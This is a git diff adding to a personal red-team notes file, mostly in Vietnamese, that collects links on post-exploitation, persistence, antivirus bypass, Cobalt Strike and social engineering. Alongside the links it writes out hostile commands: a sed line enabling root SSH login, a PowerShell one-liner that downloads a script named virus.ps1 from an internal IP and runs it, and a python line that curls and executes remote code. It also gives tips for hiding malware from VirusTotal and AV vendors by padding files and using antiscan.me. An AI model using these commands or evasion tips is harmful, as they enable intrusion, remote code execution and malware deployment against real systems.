@@ -1,7 +1,47 @@
 https://viblo.asia/p/ky-thuat-post-exploitation-trong-red-team-p1-linux-Ny0VGjXYLPA --> keylogger,bypass antivirus   .bashrc .vimrc file
 https://viblo.asia/p/share-libraries-hijacking-tren-linux-gAm5yEVX5db  --> lib injection
 
+https://viblo.asia/p/ky-thuat-persistence-trong-red-teaming-phan-1-x7Z4D6ryLnX#_persistence-with-suid-binary-3
+https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/
+
 https://viblo.asia/p/linux-lateral-movement-leo-quyen-ngang-tren-linux-1Je5EzX1KnL  --> decode rsa_id
+write the log of ssh
 Pamspy "bắt" được mật khẩu
+https://aidanstansfield.github.io/2020/05/15/sharkyctf-penteeeeest.html#exploiting-png-upload
+sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config  #ssh login as root
+
+https://anonyviet.com/cach-cai-dat-va-su-dung-cobalt-strike-danh-cho-red-team/
 
 https://viblo.asia/p/bypass-applocker-tren-windows-XL6lAen4lek
+https://quantrimang.com/cong-nghe/giau-du-lieu-trong-1-tap-tin-van-ban-bi-mat-72691
+dir /r    #detact
+
+https://quantrimang.com/cong-nghe/trojan-gia-lam-pdf-bang-phuong-phap-rlo-195731 fake pdf (anti virus blocked)
+
+https://viblo.asia/p/bypass-powershell-execution-policies-tren-windows-MG24BrER4z3
+(kỹ thuật này vô hiệu hóa các phần mềm diệt Virus thông thường)
+powershell -nop -c "iex (New-Object Net.WebClient).DownloadString ('http://10.0.37.216:8080/virus.ps1')"
+python -c "`curl https://raw.githubusercontent.com/Shengpy/test/main/a.py`"
+
+https://nhattruong.blog/2022/12/25/tan-cong-social-engineering-toan-tap-part-2/ ---social engineering
+
+https://viblo.asia/p/kiosk-breakouts-lo-hong-la-tai-va-cau-chuyen-bypass-cay-atm-cua-mot-ngan-hang-m2vJPOyx4eK#_7-cau-chuyen-ve-bypass-cay-atm-cua-mot-ngan-hang-9
+//etc/hostname
+file://var/www/localhost
+file://, chrome:// , ftp:// , mailto:// smb:// 
+irc://
+#---------------------------------------------------create malware
+chèn thêm rất nhiều byte 0 vào cuối để tăng kích thước lên trên 700MB, Virus total giới hạn kích thước tải lên là 650MB
+https://cookiearena.org/case-study/phan-tich-ma-doc-tan-cong-doanh-nghiep-ban-hang-online/
+
+VirusTotal hay mách lẻo, nếu nó phát hiện phần mềm của chúng ta là độc hại. Nó sẽ chia sẻ hash cho tất cả các phần mềm AV khác được biết. Điều này tốt cho người dùng nhưng không tốt cho Pentester . Cho nên antiscan.me là lựa chọn tốt hơn (tuy rằng công cụ này cũng rất giỏi vòi tiền)
+#-------------------------------------------------bypass antivirus
+https://viblo.asia/p/bypass-powershell-execution-policies-tren-windows-MG24BrER4z3
+https://topdev.vn/blog/huong-dan-cai-dat-clamav-tren-linux-de-quet-virus-malware-trojan/
+#------------------------------------------------------------------tool
+https://websitehcm.com/10-phan-mem-keylogger-mien-phi-tot-nhat/
+https://nhattruong.blog/2022/10/27/mot-so-payload-khi-test-truong-email/  --test email
+#-------------------------------------------------scan system
+https://anonyviet.com/cach-quet-lo-hong-he-thong-bang-mitre-attck/
+
+thư mục startup của Windows
